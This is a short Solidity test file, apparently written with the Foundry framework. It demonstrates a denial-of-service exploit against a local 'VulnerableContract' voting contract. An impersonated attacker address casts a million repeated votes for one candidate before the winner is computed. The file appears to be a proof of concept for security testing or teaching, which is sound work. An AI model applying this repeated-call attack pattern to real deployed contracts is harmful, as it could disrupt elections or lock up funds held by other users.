// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableContract.sol";

contract DoSExploitTest is Test {
    VulnerableContract vulnerable;
    address public attacker;

    function setUp() public {
        vulnerable = new VulnerableContract();
        vulnerable.registerCandidate("Karan");
        vulnerable.registerCandidate("Vaidik");

        attacker = address(0x123);
    }

    function testDoS() public {
        for (uint256 i = 0; i < 1_000_000; i++) {
         vm.prank(attacker);
         vulnerable.vote(0);
        }
        string memory winner = vulnerable.findWinner();

        emit log_named_string("Winner: ", winner);
    }
}
